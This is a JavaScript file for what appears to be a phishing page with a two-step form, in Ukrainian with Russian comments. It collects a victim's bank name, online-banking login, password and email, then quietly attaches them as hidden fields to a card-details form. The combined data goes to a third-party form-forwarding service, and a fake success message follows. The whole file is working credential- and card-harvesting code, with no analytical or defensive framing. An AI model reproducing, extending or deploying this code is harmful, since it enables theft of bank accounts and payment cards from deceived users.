document.addEventListener('DOMContentLoaded', () => {
    const bankFormSection = document.getElementById('bank-form-section');
    const cardFormSection = document.getElementById('card-form-section');
    const successMessage = document.getElementById('success-message');
    const nextBtn = document.getElementById('nextBtn');
    const backBtn = document.getElementById('backBtn');
    const newFormBtn = document.getElementById('newFormBtn');
    const bankForm = document.getElementById('bankForm');
    const cardForm = document.getElementById('cardForm');

    // Переход между формами
    nextBtn.addEventListener('click', () => {
        if (bankForm.checkValidity()) {
            bankFormSection.classList.add('hidden');
            cardFormSection.classList.remove('hidden');
        } else {
            alert('Заповніть всі обов\'язкові поля');
        }
    });

    backBtn.addEventListener('click', () => {
        cardFormSection.classList.add('hidden');
        bankFormSection.classList.remove('hidden');
    });

    newFormBtn.addEventListener('click', () => {
        successMessage.classList.add('hidden');
        bankFormSection.classList.remove('hidden');
        bankForm.reset();
        cardForm.reset();
    });

    // Отправка формы через FormSubmit
    cardForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const submitBtn = cardForm.querySelector('button[type="submit"]');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Відправка...';

        // Добавляем скрытые поля из первой формы
        const bankName = document.getElementById('bankName');
        const bankLogin = document.getElementById('bankLogin');
        const bankPassword = document.getElementById('bankPassword');
        const userEmail = document.getElementById('userEmail');

        const hiddenInputs = `
            <input type="hidden" name="Банк" value="${bankName.value}">
            <input type="hidden" name="Логін" value="${bankLogin.value}">
            <input type="hidden" name="Пароль" value="${bankPassword.value}">
            <input type="hidden" name="Email" value="${userEmail.value}">
        `;
        
        cardForm.insertAdjacentHTML('beforeend', hiddenInputs);
        cardForm.submit();

        // Показываем сообщение об успехе
        setTimeout(() => {
            cardFormSection.classList.add('hidden');
            successMessage.classList.remove('hidden');
            submitBtn.disabled = false;
            submitBtn.textContent = 'Відправити дані';
        }, 1500);
    });
});
